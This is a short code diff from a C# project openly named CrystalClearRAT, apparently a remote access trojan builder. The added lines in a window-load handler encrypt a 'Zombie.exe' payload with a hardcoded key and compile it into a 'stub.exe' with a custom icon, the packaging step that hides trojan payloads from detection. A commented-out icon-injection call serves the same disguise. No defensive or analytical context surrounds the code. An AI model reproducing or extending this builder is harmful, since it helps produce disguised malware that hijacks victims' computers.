@@ -3,36 +3,16 @@ using CrystalClearRAT.Functions;
 using CrystalClearRAT.Web;
 using CrystalClearRAT.Windows;
 using CrystalClearRAT.ZombieModel;
-using CrystalRATShared.Commands;
-using CrystalRATShared.Serialization;
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
-using System.Runtime.Remoting.Channels;
-using System.Runtime.Remoting.Contexts;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
-using System.Windows.Controls.Primitives;
-using System.Windows.Data;
-using System.Windows.Documents;
 using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
-using Mono.Cecil;
-using CrystalClearRAT.Properties;
-using CrystalRATShared.Helper;
-using System.IO;
-using Newtonsoft.Json;
-using CrystalClearRAT.Helper;
 using MahApps.Metro.Controls;
 using CrystalClearRAT.Stub;
+using System.Reflection;
+using System.IO;
+using System.Text;
+using CrystalClearRAT.Helper;
 
 namespace CrystalClearRAT
 {
@@ -82,7 +62,11 @@ namespace CrystalClearRAT
         private void Grid_Loaded(object sender, RoutedEventArgs e)
         {
 
-            // StubCompiler.Compile();
+            string payload = StubCompiler.EncryptPayload("Resources/Zombie.exe", "123");
+
+            StubCompiler.Compile(payload, "icon.ico", "stub.exe");
+
+            //StubCompiler.Compile();
             // IconInjector.ChangeIcon("foo.exe", "icon.ico");
         }
 
